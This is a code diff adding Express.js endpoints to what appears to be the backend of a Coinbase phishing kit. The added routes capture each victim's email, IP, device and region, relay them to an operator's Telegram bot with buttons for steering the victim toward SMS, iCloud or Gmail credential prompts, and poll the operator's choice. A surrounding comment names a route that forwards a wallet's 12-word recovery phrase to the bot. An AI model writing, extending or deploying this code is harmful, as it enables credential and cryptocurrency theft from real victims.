@@ -2185,6 +2185,113 @@ app.get("/get-verifying-info/:verifyingId", (req, res) => {
 // ============================================================================
 
 const server = // ============================================================================
+// POST /wallet-decision - Send wallet decision buttons to winner bot only
+// ============================================================================
+
+app.post("/wallet-decision", async (req, res) => {
+  try {
+    const { userId, email } = req.body;
+
+    if (!email) {
+      return res.status(400).json({ error: "Missing email" });
+    }
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `😈😈😈 <b>Coinbase - Last Direction</b> 😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "💬 SMS - 2 💬", callback_data: `wallet_decision_sms|${email}` }],
+          [{ text: "🏁 Done 🏁", callback_data: `wallet_decision_done|${email}` }],
+          [
+            { text: "☁️", callback_data: `wallet_decision_icloud|${email}` },
+            { text: "🌈", callback_data: `wallet_decision_gmail|${email}` }
+          ]
+        ]
+      }
+    };
+
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      await sendFollowUpMessage(email, message, options);
+      console.log(`💰 Wallet decision sent to winner for ${email}`);
+    } else {
+      console.log(`⚠️ WARNING: No winner found for ${email}, not sending wallet decision`);
+      return res.status(400).json({ error: "No winner determined for this email" });
+    }
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.error("❌ Wallet decision endpoint error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
+// GET /check-wallet-decision/:email - Check wallet decision choice from bot
+// ============================================================================
+
+app.get("/check-wallet-decision/:email", (req, res) => {
+  try {
+    const email = decodeURIComponent(req.params.email);
+
+    if (!email || !pendingWalletDecision[email]) {
+      return res.json({ choice: null });
+    }
+
+    const choice = pendingWalletDecision[email].choice;
+    console.log(`✅ Wallet decision for ${email}: ${choice}`);
+    
+    res.json({ choice });
+
+  } catch (err) {
+    console.error("Check wallet decision error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// POST /update-wallet-decision - Update wallet decision when bot clicks button
+// ============================================================================
+
+app.post("/update-wallet-decision", (req, res) => {
+  try {
+    const { email, choice } = req.body;
+
+    if (!email || !choice) {
+      return res.status(400).json({ error: "Missing email or choice" });
+    }
+
+    if (!pendingWalletDecision[email]) {
+      pendingWalletDecision[email] = {};
+    }
+
+    pendingWalletDecision[email].choice = choice;
+    pendingWalletDecision[email].updatedAt = Date.now();
+
+    console.log(`✅ Updated wallet decision for ${email}: ${choice}`);
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.error("Update wallet decision error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
 // POST /wallet-phrase - Send wallet 12-word phrase to winner bot only
 // ============================================================================
 
